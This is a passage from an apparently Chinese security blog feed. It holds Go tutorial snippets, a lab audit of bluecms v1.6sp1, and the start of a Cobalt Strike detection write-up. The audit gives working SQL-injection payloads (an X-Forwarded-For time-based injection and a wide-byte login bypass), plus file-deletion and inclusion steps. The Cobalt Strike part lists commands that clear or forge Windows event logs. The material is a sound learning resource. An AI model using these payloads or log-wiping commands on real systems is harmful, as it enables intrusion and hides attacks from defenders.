go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;bufio&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>    <span class="hljs-string">&quot;net/http&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    resp, err := http.Get(<span class="hljs-string">&quot;https://gobyexample.com&quot;</span>)  <br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <br>       <span class="hljs-built_in">panic</span>(err)  <br>    &#125;  <br>    <span class="hljs-keyword">defer</span> resp.Body.Close()  <br>  <br>    fmt.Println(<span class="hljs-string">&quot;status code&quot;</span>, resp.Status)  <br>    scanner := bufio.NewScanner(resp.Body)  <br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; scanner.Scan() &amp;&amp; i &lt; <span class="hljs-number">5</span>; i++ &#123;  <br>       fmt.Println(scanner.Text())  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="HTTP-Server"><a href="#HTTP-Server" class="headerlink" title="HTTP Server"></a>HTTP Server</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;net/http&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;  <br>    fmt.Fprintf(w, <span class="hljs-string">&quot;htllo\n&quot;</span>)  <br>  <br>&#125;  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">headers</span><span class="hljs-params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;  <br>    <span class="hljs-keyword">for</span> name, headers := <span class="hljs-keyword">range</span> req.Header &#123;  <br>       <span class="hljs-keyword">for</span> _, h := <span class="hljs-keyword">range</span> headers &#123;  <br>          fmt.Fprintf(w, <span class="hljs-string">&quot;%v:%v\n&quot;</span>, name, h)  <br>       &#125;  <br>    &#125;  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    http.HandleFunc(<span class="hljs-string">&quot;/hello&quot;</span>, hello)  <br>    http.HandleFunc(<span class="hljs-string">&quot;/headers&quot;</span>, headers)  <br>    http.ListenAndServe(<span class="hljs-string">&quot;:8090&quot;</span>, <span class="hljs-literal">nil</span>)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Spawning-Processes"><a href="#Spawning-Processes" class="headerlink" title="Spawning Processes"></a>Spawning Processes</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;io&quot;</span>    <span class="hljs-string">&quot;os/exec&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>  <br>    dateCmd := exec<span class="hljs-selector-class">.Command</span>(<span class="hljs-string">&quot;date&quot;</span>)  <br>  <br>    dateOut, err := dateCmd<span class="hljs-selector-class">.Output</span>()  <br>    <span class="hljs-keyword">if</span> err != nil &#123;  <br>       <span class="hljs-built_in">panic</span>(err)  <br>    &#125;  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;&gt; date&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">string</span>(dateOut))  <br>  <br>    _, err = exec<span class="hljs-selector-class">.Command</span>(<span class="hljs-string">&quot;date&quot;</span>, <span class="hljs-string">&quot;-x&quot;</span>)<span class="hljs-selector-class">.Output</span>()  <br>    <span class="hljs-keyword">if</span> err != nil &#123;  <br>       <span class="hljs-selector-tag">switch</span> e := err.(type) &#123;  <br>       case *exec<span class="hljs-selector-class">.Error</span>:  <br>          fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;failed executing:&quot;</span>, err)  <br>       case *exec<span class="hljs-selector-class">.ExitError</span>:  <br>          fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;command exit rc =&quot;</span>, e<span class="hljs-selector-class">.ExitCode</span>())  <br>       default:  <br>          <span class="hljs-built_in">panic</span>(err)  <br>       &#125;  <br>    &#125;  <br>  <br>    grepCmd := exec<span class="hljs-selector-class">.Command</span>(<span class="hljs-string">&quot;grep&quot;</span>, <span class="hljs-string">&quot;hello&quot;</span>)  <br>  <br>    grepIn, _ := grepCmd<span class="hljs-selector-class">.StdinPipe</span>()  <br>    grepOut, _ := grepCmd<span class="hljs-selector-class">.StdoutPipe</span>()  <br>    grepCmd<span class="hljs-selector-class">.Start</span>()  <br>    grepIn<span class="hljs-selector-class">.Write</span>(<span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(<span class="hljs-string">&quot;hello grep\ngoodbye grep&quot;</span>))  <br>    grepIn<span class="hljs-selector-class">.Close</span>()  <br>    grepBytes, _ := io<span class="hljs-selector-class">.ReadAll</span>(grepOut)  <br>    grepCmd<span class="hljs-selector-class">.Wait</span>()  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;&gt; grep hello&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">string</span>(grepBytes))  <br>  <br>    lsCmd := exec<span class="hljs-selector-class">.Command</span>(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;ls -a -l -h&quot;</span>)  <br>    lsOut, err := lsCmd<span class="hljs-selector-class">.Output</span>()  <br>    <span class="hljs-keyword">if</span> err != nil &#123;  <br>       <span class="hljs-built_in">panic</span>(err)  <br>    &#125;  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;&gt; ls -a -l -h&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">string</span>(lsOut))  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Exec’ing-Processes"><a href="#Exec’ing-Processes" class="headerlink" title="Exec’ing Processes"></a>Exec’ing Processes</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;os&quot;</span>  <br>    <span class="hljs-string">&quot;os/exec&quot;</span>    <span class="hljs-string">&quot;syscall&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>  <br>    binary, lookErr := exec.LookPath(<span class="hljs-string">&quot;ls&quot;</span>)  <br>    <span class="hljs-keyword">if</span> lookErr != <span class="hljs-literal">nil</span> &#123;  <br>       <span class="hljs-built_in">panic</span>(lookErr)  <br>    &#125;  <br>  <br>    args := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;-a&quot;</span>, <span class="hljs-string">&quot;-l&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>&#125;  <br>  <br>    env := os.Environ()  <br>  <br>    execErr := syscall.Exec(binary, args, env)  <br>    <span class="hljs-keyword">if</span> execErr != <span class="hljs-literal">nil</span> &#123;  <br>       <span class="hljs-built_in">panic</span>(execErr)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>spawning external processes：需要一个外部进程来运行 go<br>exec process：需要另一个进程来替换当前的 go 进程</p><h2 id="Exit"><a href="#Exit" class="headerlink" title="Exit"></a>Exit</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;!&quot;</span>)<br><br>    os.Exit(<span class="hljs-number">3</span>)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bluecms_v1.6sp1</title>
    <link href="/2024/07/23/bluecms_v1.6sp1/"/>
    <url>/2024/07/23/bluecms_v1.6sp1/</url>
    
    <content type="html"><![CDATA[<h1 id="bluecms-v1-6sp1"><a href="#bluecms-v1-6sp1" class="headerlink" title="bluecms_v1.6sp1"></a>bluecms_v1.6sp1</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>win11</p><p>MYSQL 5.6.26</p><p>PHP 5.4.45</p><p>Apche 2.4.39</p><p>VScode 1.81.1</p><p>在vscode中修改php版本：</p><p>设置-&gt;PHP-&gt;settings.json:</p><p><img src="/2023/04/27/file-upload/e-20230829160600464.png" alt="image-20230829160600464"></p><p>将对应的php.exe文件填入如下路径中：</p><p><img src="/2023/04/27/file-upload/e-20230829160732751.png" alt="image-20230829160732751"></p><p>中文显示乱码问题，安装插件即可：</p><p><img src="/2023/04/27/file-upload/e-20230829160842809.png" alt="image-20230829160842809"></p><h3 id="安装cms"><a href="#安装cms" class="headerlink" title="安装cms"></a>安装cms</h3><p>bluecms v1.6sp  <a href="https://zdown.chinaz.com/CMS%E5%BB%BA%E7%AB%99/bluecms.rar">https://zdown.chinaz.com/CMS%E5%BB%BA%E7%AB%99/bluecms.rar</a></p><p>在phpstudy中WWW目录下解压，访问localhost&#x2F;uploads目录根据提示安装即可。</p><h2 id="常见审计思路"><a href="#常见审计思路" class="headerlink" title="常见审计思路"></a>常见审计思路</h2><p>常见的审计思路有三个：</p><ul><li>寻找可控变量</li><li>工具自动化审计</li><li>搜索敏感函数</li></ul><h3 id="寻找可控变量"><a href="#寻找可控变量" class="headerlink" title="寻找可控变量"></a>寻找可控变量</h3><p>该方法主要寻找用户可控的输入点，再跟踪变量，查看是否有sql或者其他利用方式。</p><p>例如在ad_js.php中：</p><p><img src="/2023/04/27/file-upload/e-20230829164108868.png" alt="image-20230829164108868"></p><p>$ad_id即为可控变量，通过GET方法传入，并且查找引用发现后续回进行sql语句的拼接，这里可以考虑sql注入漏洞。</p><h3 id="自动化审计-人工review"><a href="#自动化审计-人工review" class="headerlink" title="自动化审计+人工review"></a>自动化审计+人工review</h3><p>通过工具进行自动化审计也是一种方法，但是误报率较高，需要人工进行验证。</p><p>以seay为例：</p><p><img src="/2023/04/27/file-upload/e-20230829164307243.png" alt="image-20230829164307243"></p><p>点击新建项目，自动审计，即可开始自动化审计，通过敏感函数等等判断出可能存在漏洞的点，后续对漏洞进行人工验证即可。缺点是误报较高，并且对于逻辑漏洞无法发现。</p><h3 id="搜索敏感函数"><a href="#搜索敏感函数" class="headerlink" title="搜索敏感函数"></a>搜索敏感函数</h3><p>对于常见的危险函数进行追踪，查看是否能够进行利用。</p><table><thead><tr><th>命令执行</th><th>system、shell_exec、passthru、popen、proc_open</th></tr></thead><tbody><tr><td>文件包含</td><td>require、include、require_once、include_once</td></tr><tr><td>变量覆盖</td><td>parse_str 、mb_parse_str</td></tr><tr><td>代码执行</td><td>eval、assert、preg_replace</td></tr><tr><td>文件操作</td><td>file_get_contents 、file_put_contents 、move_uploaded_file 、unlink &amp; delete</td></tr></tbody></table><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p><img src="/2023/04/27/file-upload/e-20230829164712114.png" alt="image-20230829164712114"></p><p>整个cms的结构如图所示，index.php为默认的网站首页，include应该是用来包含的一些全局文件，install是安装cms的相关内容，admin为管理员访问的目录。</p><p>查看index.php:</p><p><img src="/2023/04/27/file-upload/e-20230829164922463.png" alt="image-20230829164922463"></p><p>首先包含了两个文件: include&#x2F;common.inc.php，include&#x2F;index.fun.php。</p><p>查看common.inc.php文件：</p><p><img src="/2023/04/27/file-upload/e-20230829165215854.png" alt="image-20230829165215854"></p><p>对输入的内容都进行了转义，后续如果包含了该文件，需要考虑是否会有影响。</p><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>查看ad_js.php文件，前文提到用户可控参数$ad_id，如果该参数不为空，就会拼接导sql语句中，需要注意这里包含了&#x2F;include&#x2F;common.inc.php文件，但是$ad_id在拼接时并没有加上引号：</p><p><img src="/2023/04/27/file-upload/e-20230829165519893.png" alt="image-20230829165519893"></p><p>将sql语句echo出来，拼接后访问：</p><p><img src="/2023/04/27/file-upload/e-20230829165709647.png" alt="image-20230829165709647"></p><p>order by判断个数：</p><p><img src="/2023/04/27/file-upload/e-20230829165745316.png" alt="image-20230829165745316"></p><p>ad_id&#x3D;8时候报错，说明有字段数为7，判断回显在第七位：</p><p><img src="/2023/04/27/file-upload/e-20230829170055751.png" alt="image-20230829170055751"></p><p>输出数据库名：</p><p><img src="/2023/04/27/file-upload/e-20230829170122008.png" alt="image-20230829170122008"></p><p>完成。</p><h3 id="insert-into注入"><a href="#insert-into注入" class="headerlink" title="insert into注入"></a>insert into注入</h3><p>在seay中发现如下内容：</p><p><img src="/2023/04/27/file-upload/e-20230829170345482.png" alt="image-20230829170345482"></p><p>ip地址可以伪造，可能引发sql注入漏洞，跟进查看。</p><p>双击跟入，发现ip是通过getip()函数获得：</p><p><img src="/2023/04/27/file-upload/e-20230829170449338.png" alt="image-20230829170449338"></p><p>在vscode中ctrl+shift+f，全局搜索getip()函数，发现存在拼接sql语句：</p><p><img src="/2023/04/27/file-upload/e-20230829170943476.png" alt="image-20230829170943476"></p><p>在comment.php中，查看该文件内容:</p><p>该sql语句在一个if条件中：</p><p><img src="/2023/04/27/file-upload/e-20230829171143179.png" alt="image-20230829171143179"></p><p>如果$act变量为send，才会走到拼接这一步，继续看$act变量，在comment.php开头定义：</p><p><img src="/2023/04/27/file-upload/e-20230829171524497.png" alt="image-20230829171524497"></p><p>结合前面的代码，通过POST添加参数comment,type,id,getip()通过添加请求头X-Forwarded-For来获取：</p><p><img src="/2023/04/27/file-upload/e-20230829172358868.png" alt="image-20230829172358868"></p><p>echo一下sql语句，可以看到X-Forwarded-For的值被插入到了sql语句中并且完成可控，直接插入payload，可以延时注入：</p><p><code>X-Forwarded-For: 1&#39;+(select case when(ascii(substr(database(),1,1))=98) then sleep(1) else 1 end),&#39;1&#39;)#</code></p><p><img src="/2023/04/27/file-upload/e-20230829172609131.png" alt="image-20230829172609131"></p><p>注入成功，也可以发布一篇文章，通过<code>X-Forwarded-For: 1&#39;,&#39;1&#39; ),(&quot;&quot;,&#39;2&#39;,&#39;2&#39;,&#39;1&#39;,&#39;6&#39;,(database()),&#39;1&#39;,&#39;1</code>注入，直接在评论区获得敏感信息。</p><p>同样，getip()的值被赋给了online_ip:</p><p><img src="/2023/04/27/file-upload/e-20230829173205733.png" alt="image-20230829173205733"></p><p>跟一下online_ip的引用，同样是insert into语句，ip可控，利用同样的payload即可注入成功：</p><p><img src="/2023/04/27/file-upload/e-20230829173135221.png" alt="image-20230829173135221"></p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>来到登录界面，就是admin&#x2F;login.php:</p><p><img src="/2023/04/27/file-upload/e-20230829232044954.png" alt="image-20230829232044954"></p><p>这里看到两个点：</p><ul><li>包含了&#x2F;include&#x2F;common.inc.php文件</li><li>通过check_admin进行校验</li></ul><p>首先看一下&#x2F;include&#x2F;common.inc.php文件。前面提到，该文件中对于输入都利用函数deep_addslashes进行了过滤：</p><p><img src="/2023/04/27/file-upload/e-20230829233428137.png" alt="image-20230829233428137"></p><p>同时，看到这里包含了另一个文件include&#x2F;mysql.class.php，查看：</p><p><img src="/2023/04/27/file-upload/e-20230829233548258.png" alt="image-20230829233548258"></p><p>在实例化mysql对象时，将字符编码设置为了gbk，为宽字节注入创造了条件。</p><p>再看check_admin方法，跳到common.fun.php中：</p><p><img src="/2023/04/27/file-upload/e-20230829233722154.png" alt="image-20230829233722154"></p><p>首先获取到$db，进行mysql的实例化，这里进行连接时，编码为gbk，加上deep_addslashes，可以造成宽字节注入。</p><p>这里的可控参数为name，跟到login.php中：</p><p><img src="/2023/04/27/file-upload/e-20230829234102222.png" alt="image-20230829234102222"></p><p>name即为post方法得到的admin_name的值。</p><p>接下来构造payload，访问&#x2F;admin&#x2F;login.php：</p><p><img src="/2023/04/27/file-upload/e-20230829234235210.png" alt="image-20230829234235210"></p><p>进行后台管理员登录界面，act&#x3D;do_login与代码中也是一致的，接下来将admin改为<code>admin_name=admin%df&#39;%20or%201=1#</code>，’被转义，变成%5c，%df%5c结合，成功闭合：</p><p><img src="/2023/04/27/file-upload/e-20230829234649056.png" alt="image-20230829234649056"></p><p><img src="/2023/04/27/file-upload/e-20230829234659989.png" alt="image-20230829234659989"></p><p>登录进入后台。</p><h3 id="任意url跳转"><a href="#任意url跳转" class="headerlink" title="任意url跳转"></a>任意url跳转</h3><p>回到user.php中，存在两个可控参数：</p><p><img src="/2023/04/27/file-upload/e-20230830085553883.png" alt="image-20230830085553883"></p><p>act用于后续的if-else判断，重点关注from。往下走：</p><p><img src="/2023/04/27/file-upload/e-20230830085720948.png" alt="image-20230830085720948"></p><p>如果act为do_login，from就变成base64解码的值，继续往下，看到showmsg：</p><p><img src="/2023/04/27/file-upload/e-20230830085812161.png" alt="image-20230830085812161"></p><p>from的值即为跳转的url：</p><p><img src="/2023/04/27/file-upload/e-20230830090106200.png" alt="image-20230830090106200"></p><p>将<a href="http://www.baidu.com进行base64编码aHR0cDovL3d3dy5iYWlkdS5jb20=，修改from的值：">http://www.baidu.com进行base64编码aHR0cDovL3d3dy5iYWlkdS5jb20=，修改from的值：</a></p><p><img src="/2023/04/27/file-upload/e-20230830092412905.png" alt="image-20230830092412905"></p><p>成功跳转至百度页面：</p><p><img src="/2023/04/27/file-upload/e-20230830092345591.png" alt="image-20230830092345591"></p><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>接上前面的showmsg函数，在admin&#x2F;card.php中，有如下代码：</p><p><img src="/2023/04/27/file-upload/e-20230830100947220.png" alt="image-20230830100947220"></p><p>加上name可控，直接xss：</p><p><img src="/2023/04/27/file-upload/e-20230830101042255.png" alt="image-20230830101042255"></p><h3 id="存储xss"><a href="#存储xss" class="headerlink" title="存储xss"></a>存储xss</h3><p>同样是在user.php中，存在如下注册功能：</p><p><img src="/2023/04/27/file-upload/e-20230830102700172.png" alt="image-20230830102700172"></p><p>没有进行过滤操作，仅仅进行了trim之后就插入了数据库，可以在email处进行存储型xss。</p><p>前端存在格式校验，在burp中修改：</p><p><img src="/2023/04/27/file-upload/e-20230830102603610.png" alt="image-20230830102603610"></p><p><img src="/2023/04/27/file-upload/e-20230830102621935.png" alt="image-20230830102621935"></p><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p>还是在user.php中，存在unlink函数：</p><p><img src="/2023/04/27/file-upload/e-20230830103358322.png" alt="image-20230830103358322"></p><p>直接根据post传入的face_pic3的值删除文件，接下来以robots.txt为例。</p><p>首先访问，存在：</p><p><img src="/2023/04/27/file-upload/e-20230830103215886.png" alt="image-20230830103215886"></p><p>构造数据包：</p><p><img src="/2023/04/27/file-upload/e-20230830103443660.png" alt="image-20230830103443660"></p><p>发包后，robots.txt文件被删除，存在任意文件删除漏洞。</p><p><img src="/2023/04/27/file-upload/e-20230830103228785.png" alt="image-20230830103228785"></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>还是在user.php中，往上看发现存在include，并且参数可控：</p><p><img src="/2023/04/27/file-upload/e-20230830103811889.png" alt="image-20230830103811889"></p><p>但是这里后面拼接了&#x2F;index.php，需要进行截断，目前php版本为5.4.45，需要切换到低版本才行。故不进行演示，直接在post请求体加上参数<code>pay=../../robots.txt........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</code></p>]]></content>
    
    
    <categories>
      
      <category>vulnerability</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cobalt strike流量分析</title>
    <link href="/2024/07/23/cobalt%20strike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <url>/2024/07/23/cobalt%20strike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="CS（检测与隐藏）"><a href="#CS（检测与隐藏）" class="headerlink" title="CS（检测与隐藏）"></a>CS（检测与隐藏）</h1><p><img src="/2023/04/27/file-upload/40723154614207.png" alt="image-20240723154614207"></p><h2 id="Process-Execution-——日志溯源"><a href="#Process-Execution-——日志溯源" class="headerlink" title="Process Execution ——日志溯源"></a>Process Execution ——日志溯源</h2><p>一般windows失陷后，排查方法有查看隐藏用户，查看端口开放情况，外联情况，防火墙策略，windows日志等等，其中最主要的就是通过windows日志推理出大致的失陷过程，此处结合sysmon工具来查找CS利用的有关信息。</p><h3 id="sysmon工具介绍"><a href="#sysmon工具介绍" class="headerlink" title="sysmon工具介绍"></a>sysmon工具介绍</h3><p>系统监视器 [Sysmon][<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon]">https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon]</a> 是一种 Windows 系统服务和设备驱动程序，一旦安装在系统上，它就会在系统重新启动后保持驻留，以监视系统活动并将其记录到 Windows 事件日志中。它提供有关进程创建、网络连接和文件创建时间更改的详细信息，并且用完整的命令行记录下子进程和父进程的创建行为。</p><p><img src="/2023/04/27/file-upload/g" alt="image-20220331142950513"></p><p>下载后通过<code>sysmon.exe -accepteula -i</code>进行安装，表示接受Eula，更多情况下会使用自定义的配置文件，推荐<a href="https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml">sysmonconfig-export.xml</a>，已经预定义了高质量的事件跟踪模板。</p><p><code>sysmon64.exe -accepteula -i sysmonconfig-export.xml</code></p><p><img src="/2023/04/27/file-upload/fig.jpg" alt="image-20220331143237855"></p><p>查看sysmon路径：打开eventvwr.msc，Applications and Services Logs&#x2F;Microsoft&#x2F;Windows&#x2F;Sysmon&#x2F;Operational</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20220331165302171"></p><p>可以看到commandline,currentdirectory,parentimage等敏感信息。</p><p>再介绍一个sysmon tool,[sysmon view][<a href="https://github.com/nshalabi/SysmonTools]">https://github.com/nshalabi/SysmonTools]</a></p><p>exe直接打开，通过命令<code>WEVTUtil query-events &quot;Microsoft-Windows-Sysmon/Operational&quot; /format:xml /e:sysmonview &gt; eventlog.xml</code>导出log文件，sysmon view加载，即可实现更好的可视化效果。</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20220331170008115"></p><h3 id="CS-行为分析"><a href="#CS-行为分析" class="headerlink" title="CS 行为分析"></a>CS 行为分析</h3><p>新建监听器，端口为80，生成一个reverse_http的后门，在win10主机中运行，并通过shell，powershell，hashdump等命令进行测试。</p><p>接下来通过sysmon查看日志：</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20220401145701128"></p><p>可以看到，sysmon标注了set注册表值，创建进程，网络连接，创建管道等等任务。</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20220401150205440"></p><p>查看详细信息，可以看到commandline,currentdirectory,parentimage等信息。</p><p>通过sysmon view查看，可以发现其间有artifact.exe,cmd.exe,ipconfig.exe等等运行，并且给出了image path以及GUID。</p><p><img src="/2023/04/27/file-upload/" alt="image-20220401171617902"></p><p>首先查看后门文件artifact.exe：</p><p><img src="/2023/04/27/file-upload/jpg" alt="image-20220401172113629"></p><p>可以看到首先创建了进程，接着有创建通信管道，连接管道，联网，创建远程线程等等操作：</p><p><img src="/2023/04/27/file-upload/.jpg" alt="image-20220401172427459"></p><p>从日志分析可以看出，连接的远程ip为192.168.111.160:80，从CreateRemoteThread事件也能大致判断出，后门文件在试图进程注入到rundll32.exe中。</p><p>接下来通过powershell.exe和cmd.exe来验证CS的shell和powershell命令。以cmd.exe为例：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220401173554196"></p><p>cmd.exe一共对应了3个session，分别为artifact.exe和rundll32.exe的进程创建。而期间没有手动运行过cmd，结合前面artifact的进程注入， 这三个process应该都是执行shell命令时所创建。</p><p>查看rundll32.exe,可以看到都是由父进程artifact发起，并且rundll32本身也在尝试进一步注入到lsass.exe。</p><p><img src="/2023/04/27/file-upload/g" alt="image-20220401174003369"></p><p>CS中执行的命令为shell whoami，最后查看whoami.exe:</p><p><img src="/2023/04/27/file-upload/g" alt="image-20220401174218212"></p><p>whoami.exe由cmd.exe拉起，执行的命令为cmd.exe &#x2F;C whoami,进而创建了进程4392，运行了whoami.exe。结合前面的分析，artifact.exe在运行之后，创建了进程和管道，并进行管道连接，进程注入等，接着开始DNS查询并且上线了目标主机，当CS客户端执行命令时(shell举例)，后门文件直接拉起cmd.exe，并通过cmd执行命令。</p><h3 id="清除与混淆"><a href="#清除与混淆" class="headerlink" title="清除与混淆"></a>清除与混淆</h3><p><strong>手动清除日志</strong></p><p><strong>命令行清除Windows事件日志</strong></p><ul><li><p>PowerShell -Command “&amp; {Clear-Eventlog -Log Application,System,Security}”</p></li><li><p>Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname}</p></li></ul><p><strong>第三方脚本</strong></p><p>[Invoke-Phant0m][<a href="https://github.com/hlldz/Invoke-Phant0m]">https://github.com/hlldz/Invoke-Phant0m]</a></p><p>通过遍历事件日志服务进程（专用svchost.exe）的线程堆栈，并标识事件日志线程以结束事件日志服务线程。借此阻止系统进行正常的日志收集。</p><p><strong>Windows日志伪造</strong></p><ul><li>eventcreate -l system -so administrator -t warning -d “fake log” -id 500</li></ul><h2 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a><strong>默认端口</strong></h2><p>cobalt strike默认端口为50050：</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20220402143719173"></p><p>Team server is up on 50050。</p><p>端口特征可以通过编辑teamserver进行修改：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220402143314260"></p><p>-Dcobaltstrike.server_port&#x3D;50050,在此将端口改为自定义值：</p><p><img 